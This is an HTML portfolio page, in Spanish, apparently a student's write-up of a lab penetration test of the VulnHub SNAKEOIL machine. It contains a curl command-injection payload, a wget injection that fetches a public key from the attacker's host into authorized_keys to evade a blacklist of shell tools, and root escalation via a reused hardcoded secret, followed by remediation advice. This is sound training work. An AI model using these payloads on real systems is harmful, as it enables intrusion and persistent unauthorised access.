@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proyecto PR1 | Portafolio LFJB</title>
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <header class="top-nav">
+        <div class="nav-brand">
+            <img src="../../assets/img/logo-upslp.png" alt="Logo UPSLP" class="logo">
+            <span class="brand-title">Portafolio CNO IV</span>
+        </div>
+        <nav>
+            <ul>
+                <li><a href="../../index.html">Inicio</a></li>
+                <li><a href="../index.html" style="color: var(--text-main);">Parcial 1</a></li>
+                <li><a href="../../parcial2/index.html">Parcial 2</a></li>
+                <li><a href="../../parcial3/index.html">Parcial 3</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="activity-main">
+        <div class="activity-header">
+            <a href="../index.html" class="back-link"><i class="fa-solid fa-arrow-left"></i> Volver a Parcial 1</a>
+            <p class="overline"><span class="line"></span> PROYECTO 1 · PENTESTING <span class="line"></span></p>
+            <h1 class="activity-title" style="color: var(--accent-blue);">De la teoría a la práctica: Walkthrough en acción</h1>
+        </div>
+
+        <section class="card intro-card" style="border-left-color: var(--accent-blue);">
+            <p>Auditoría de seguridad y pruebas de penetración éticas ejecutadas sobre la máquina virtual <strong style="color: var(--accent-blue);">SNAKEOIL</strong> de VulnHub, simulando un entorno de caja negra.</p>
+            <br>
+            <p>Este informe documenta el proceso completo: reconocimiento en red aislada, enumeración de una API Flask vulnerable, inyección de comandos evadiendo listas negras, persistencia vía SSH y escalada de privilegios a <code>root</code>.</p>
+        </section>
+
+        <!-- LAYOUT ASIMÉTRICO (Contenido Izquierda / Sidebar Derecha) -->
+        <div class="layout-sidebar" style="margin-top: 3rem;">
+            
+            <div class="main-content">
+                
+                <!-- PREPARACIÓN DEL ENTORNO -->
+                <h2 class="section-heading"><i class="fa-solid fa-network-wired"></i> Preparación del Laboratorio</h2>
+                <p>Para garantizar un entorno seguro y ético, se configuró la máquina SNAKEOIL y Kali Linux en una red <strong>Host-Only</strong> (Solo-anfitrión), habilitando el servidor DHCP de VirtualBox para evitar salidas a Internet o a la red física.</p>
+                
+                <div class="evidence-grid">
+                    <div>
+                        <img src="img/figura_1.jpg" alt="Configuración de Kali en modo NAT" class="evidence-img">
+                        <p style="text-align: center; font-size: 0.85rem; color: var(--text-muted); margin-top: 5px;">Fig 1 y 2: Intentos de configuración de red</p>
+                    </div>
+                    <div>
+                        <img src="img/figura_3.jpg" alt="Servidor DHCP en VirtualBox" class="evidence-img">
+                        <p style="text-align: center; font-size: 0.85rem; color: var(--text-muted); margin-top: 5px;">Fig 3 y 4: Adaptador Host-Only con DHCP (192.168.56.x)</p>
+                    </div>
+                </div>
+
+                <!-- FASE 1 Y 2: RECONOCIMIENTO Y ESCANEO -->
+                <h2 class="section-heading" style="margin-top: 3rem;"><i class="fa-solid fa-radar"></i> Fase 1 y 2: Reconocimiento y Escaneo</h2>
+                <p>Sin conocimiento previo de la IP objetivo (Caja Negra), se utilizó <code>netdiscover</code> para ubicar la máquina, seguido de un escaneo profundo con <code>nmap</code> a los 65,535 puertos.</p>
+                
+                <div class="code-block" style="margin: 1.5rem 0;">
+                <pre><code><span class="code-comment"># Descubrimiento de hosts en la red aislada</span>
+sudo netdiscover -i eth1 -r 192.168.56.0/24
+
+<span class="code-comment"># Escaneo agresivo con detección de versiones y scripts NSE</span>
+sudo nmap -sC -sV -p 22,80,8080 -A 192.168.56.102</code></pre>
+                </div>
+
+                <div class="evidence-grid">
+                    <div>
+                        <img src="img/figura_5.jpg" alt="Resultados de Netdiscover" class="evidence-img">
+                        <p style="text-align: center; font-size: 0.85rem; color: var(--text-muted); margin-top: 5px;">Fig 5: Identificación de la IP .102</p>
+                    </div>
+                    <div>
+                        <img src="img/figura_7.jpg" alt="Resultados de Nmap" class="evidence-img">
+                        <p style="text-align: center; font-size: 0.85rem; color: var(--text-muted); margin-top: 5px;">Fig 6 y 7: Nmap revela SSH (22) y HTTP (80, 8080)</p>
+                    </div>
+                </div>
+
+                <!-- FASE 3: ENUMERACIÓN WEB -->
+                <h2 class="section-heading" style="margin-top: 3rem;"><i class="fa-solid fa-folder-tree"></i> Fase 3: Enumeración de Servicios Web</h2>
+                <p>El puerto 8080 alojaba la aplicación "Good Tech Inc.". Al realizar fuzzing de directorios con <code>gobuster</code>, se descubrieron rutas críticas ocultas.</p>
+                
+                <ul class="custom-list">
+                    <li><strong>/users:</strong> Fuga de información. Expuso el usuario <em>patrick</em> y su hash pbkdf2-sha256 sin autenticación.</li>
+                    <li><strong>/login y /registration:</strong> Endpoints de autenticación JWT de la API Flask.</li>
+                    <li><strong>/run y /secret:</strong> Funciones administrativas ocultas.</li>
+                </ul>
+
+                <div class="evidence-grid">
+                    <div>
+                        <img src="img/figura_10.jpg" alt="Resultados de Gobuster" class="evidence-img">
+                        <p style="text-align: center; font-size: 0.85rem; color: var(--text-muted); margin-top: 5px;">Fig 10: Gobuster revela endpoints críticos</p>
+                    </div>
+                    <div>
+                        <img src="img/figura_11.jpg" alt="Fuga de información en endpoint users" class="evidence-img">
+                        <p style="text-align: center; font-size: 0.85rem; color: var(--text-muted); margin-top: 5px;">Fig 11: Information Disclosure del usuario 'patrick'</p>
+                    </div>
+                </div>
+
+                <!-- FASE 4: EXPLOTACIÓN -->
+                <h2 class="section-heading" style="margin-top: 3rem;"><i class="fa-solid fa-bug"></i> Fase 4: Explotación (RCE)</h2>
+                <p>Tras registrar un usuario falso, se obtuvo un JWT. Se descubrió que el endpoint <code>/secret</code> requería el JWT inyectado como <em>Cookie</em> y no como Header de Autorización. Esto permitió extraer la clave secreta para abusar del endpoint <code>/run</code>.</p>
+                
+                <div class="conclusion-box" style="margin: 1.5rem 0; border-left-color: var(--accent-blue); background-color: rgba(88, 166, 255, 0.05);">
+                    <p><i class="fa-solid fa-triangle-exclamation" style="color: var(--accent-blue);"></i> <strong>Concepto Teórico: OS Command Injection</strong><br>
+                    El endpoint <code>/run</code> concatenaba la entrada del usuario directamente en la función <code>subprocess.Popen</code> con <code>shell=True</code>. Usando backticks, se logró inyectar comandos de sistema arbitrarios.</p>
+                </div>
+
+                <div class="code-block" style="margin: 1.5rem 0;">
+                <pre><code><span class="code-comment"># Inyección de comandos confirmada ejecutando 'whoami'</span>
+curl -X POST http://192.168.56.102:8080/run \
+  -H <span class="code-string">"Content-Type: application/json"</span> \
+  -d <span class="code-string">'{"url":"127.0.0.1:8080 `whoami`", "secret_key":"commandexecutionissecret"}'</span></code></pre>
+                </div>
+
+                <div class="evidence-grid">
+                    <div>
+                        <img src="img/figura_13.jpg" alt="Explotación de token JWT" class="evidence-img">
+                        <p style="text-align: center; font-size: 0.85rem; color: var(--text-muted); margin-top: 5px;">Fig 13: JWT inyectado en cookie para clave secreta</p>
+                    </div>
+                    <div>
+                        <img src="img/figura_14.jpg" alt="Inyección de comandos" class="evidence-img">
+                        <p style="text-align: center; font-size: 0.85rem; color: var(--text-muted); margin-top: 5px;">Fig 14: Ejecución remota de comandos en el servidor</p>
+                    </div>
+                </div>
+
+                <!-- FASE 5: POST-EXPLOTACIÓN -->
+                <h2 class="section-heading" style="margin-top: 3rem;"><i class="fa-solid fa-key"></i> Fase 5: Post-Explotación (Persistencia SSH)</h2>
+                <p>El endpoint <code>/run</code> tenía un WAF basado en listas negras que bloqueaba <em>bash, python, nc y php</em>. Para evadirlo, se generó un par de llaves SSH localmente y se inyectó un comando <code>wget</code> para depositar la llave pública directamente en el <code>authorized_keys</code> de <em>patrick</em>.</p>
+
+                <div class="code-block" style="margin: 1.5rem 0;">
+                <pre><code><span class="code-comment"># Carga de la llave pública evadiendo filtros de palabras prohibidas</span>
+{"secret_key":"commandexecutionissecret", "url":"-V & wget http://192.168.56.103:80/authorized_keys -O /home/patrick/.ssh/authorized_keys"}</code></pre>
+                </div>
+
+                <!-- FASE 6: ESCALADA DE PRIVILEGIOS -->
+                <h2 class="section-heading" style="margin-top: 3rem;"><i class="fa-solid fa-unlock-keyhole"></i> Fase 6: Escalada de Privilegios</h2>
+                <p>Con acceso SSH estable, se revisó el código fuente en <code>app.py</code>, donde se descubrió que la clave <code>JWT_SECRET_KEY</code> estaba quemada en el código (Hardcoded Credentials).</p>
+                <p>El valor <em>"NOreasonableDOUBTthisPASSWORDisGOOD"</em> había sido reutilizado por el usuario como su contraseña del sistema, permitiendo ejecutar <code>sudo su</code> para comprometer la cuenta <code>root</code>.</p>
+
+                <div class="evidence-grid">
+                    <div>
+                        <img src="img/figura_15.jpg" alt="Credenciales embebidas en app.py" class="evidence-img">
+                        <p style="text-align: center; font-size: 0.85rem; color: var(--text-muted); margin-top: 5px;">Fig 15: Revisión de código fuente (Hardcoded Credentials)</p>
+                    </div>
+                    <div>
+                        <img src="img/figura_16.jpg" alt="Escalada a root confirmada" class="evidence-img">
+                        <p style="text-align: center; font-size: 0.85rem; color: var(--text-muted); margin-top: 5px;">Fig 16: Acceso administrativo obtenido con éxito</p>
+                    </div>
+                </div>
+
+                <!-- CONCLUSIONES -->
+                <h2 class="section-heading" style="margin-top: 3rem;"><i class="fa-solid fa-shield-halved"></i> Conclusiones y Remediación</h2>
+                <p>El compromiso total del sistema demuestra cómo vulnerabilidades de severidad moderada pueden encadenarse letalmente. Las recomendaciones principales para este entorno son:</p>
+                <ul class="diamond-list" style="margin-top: 1rem;">
+                    <li>Eliminar el endpoint <code>/run</code> y evitar el uso de <code>shell=True</code> en subprocesos.</li>
+                    <li>No almacenar claves secretas en el código fuente; usar gestores de secretos o variables de entorno.</li>
+                    <li>No reutilizar secretos criptográficos para contraseñas de usuarios del sistema operativo.</li>
+                    <li>Aplicar el principio de mínimo privilegio en las configuraciones de sudoers.</li>
+                </ul>
+            </div>
+
+            <!-- SIDEBAR -->
+            <aside class="sidebar">
+                <div class="card data-card" style="border-color: var(--accent-blue);">
+                    <h3 style="text-align: center; margin-bottom: 1.5rem; color: var(--accent-blue);">Resumen Técnico</h3>
+                    
+                    <div class="data-pill">
+                        <span class="data-label" style="color: var(--accent-blue);">Duración Total</span>
+                        <span class="data-value">07 horas aprox.</span>
+                    </div>
+                    
+                    <div class="data-pill">
+                        <span class="data-label" style="color: var(--accent-blue);">Herramientas Ofensivas</span>
+                        <span class="data-value">Nmap · Netdiscover · Gobuster · cURL · SSH</span>
+                    </div>
+
+                    <div class="data-pill">
+                        <span class="data-label" style="color: var(--accent-blue);">Vulnerabilidades</span>
+                        <span class="data-value">OS Command Injection, Info Disclosure, Hardcoded Credentials</span>
+                    </div>
+                </div>
+
+                <div class="card pdf-card" style="background: linear-gradient(145deg, var(--bg-card) 0%, rgba(88, 166, 255, 0.1) 100%);">
+                    <div class="pdf-icon" style="color: var(--accent-blue);"><i class="fa-regular fa-file-pdf"></i></div>
+                    <h3>Reporte Completo</h3>
+                    <a href="Informe_Pentesting_SNAKEOIL.pdf" download class="btn-download" style="border-color: var(--accent-blue);">
+                        <i class="fa-solid fa-download"></i> Descargar PDF
+                    </a>
+                </div>
+                
+                <div class="card pdf-card" style="background: linear-gradient(145deg, var(--bg-card) 0%, rgba(88, 166, 255, 0.1) 100%);">
+                    <div class="html-icon" style="color: var(--accent-blue); font-size: 3rem; margin-bottom: 1rem;"><i class="fa-brands fa-youtube"></i></div>
+                    <h3>Walkthrough Video</h3>
+                    <!-- Reemplaza el # por tu enlace a YouTube o Drive -->
+                    <a href="#" target="_blank" class="btn-download" style="border-color: var(--accent-blue);">
+                        <i class="fa-solid fa-play"></i> Ver Grabación
+                    </a>
+                </div>
+            </aside>
+        </div>
+    </main>
+
+    <footer style="margin-top: 2rem; border-top: none;">
+        <p>&copy; 2026 Luis Felipe Jaramillo Barajas. Todos los derechos reservados.</p>
+    </footer>
+</body>
+</html>
